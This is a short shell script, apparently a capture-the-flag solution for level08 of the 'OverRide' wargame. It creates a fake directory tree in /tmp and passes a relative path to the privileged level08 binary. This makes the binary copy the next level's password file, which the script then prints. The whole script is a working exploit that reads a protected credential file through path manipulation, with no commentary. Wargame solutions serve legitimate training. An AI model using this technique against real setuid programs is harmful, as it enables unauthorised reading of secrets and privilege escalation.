#!/bin/sh

# Works only in the usage of OverRide
# Don't forget to chmod +x this file before executing

mkdir /tmp/home
mkdir /tmp/home/users
mkdir /tmp/home/users/level09
mkdir /tmp/backups

/home/users/level08/level08 "../home/users/level09/.pass"
cat /tmp/home/users/level09/.pass
